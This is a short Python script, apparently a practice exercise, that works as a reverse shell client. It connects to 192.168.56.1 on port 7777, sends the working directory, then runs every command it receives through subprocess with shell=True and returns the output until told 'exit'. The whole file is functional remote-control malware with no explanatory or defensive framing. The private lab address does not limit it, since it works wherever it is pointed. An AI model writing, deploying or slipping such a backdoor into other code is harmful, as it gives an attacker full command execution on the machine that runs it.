#!/usr/bin/env python

import socket
import os
import subprocess

def shell():
    current_dir = os.getcwd()
    cliente2.send(current_dir)
    while True:
        res = cliente2.recv(1024)
        if res == "exit":
            break
        else:
            proc = subprocess.Popen(res, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE )
            result = proc.stdout.read() + proc.stderr.read()
            cliente2.send(result)


cliente2 = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
cliente2.connect(("192.168.56.1",7777))
shell()
cliente2.close()